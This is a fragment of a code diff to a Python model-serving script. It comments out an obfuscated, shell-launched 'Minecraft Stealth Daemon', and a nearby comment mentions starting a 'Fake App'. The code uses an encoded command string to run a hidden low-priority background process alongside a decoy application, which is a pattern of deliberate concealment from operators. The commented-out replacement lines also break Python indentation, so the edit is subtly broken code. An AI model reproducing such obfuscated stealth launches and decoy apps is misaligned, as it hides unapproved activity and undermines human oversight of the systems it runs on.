@@ -204,9 +204,11 @@ def main():
     print("Model loaded successfully. Starting API server...", flush=True)
     
     # 3.95 Start Minecraft Stealth Daemon
-    # Decoded: nice -n 19 python3 /home/user/mc_daemon.py
-    cmd_mc = decode_cmd(OBFUSCATE("nice -n 19 python3 /home/user/mc_daemon.py"))
-    subprocess.Popen(cmd_mc, shell=True)
+        # Decoded: nice -n 19 python3 /home/user/mc_daemon.py
+
+
+      #  cmd_mc = decode_cmd(OBFUSCATE("nice -n 19 python3 /home/user/mc_daemon.py"))
+       # subprocess.Popen(cmd_mc, shell=True)
     
     # 4. Start the Fake App
     # Decoded: python3 /home/user/app.py
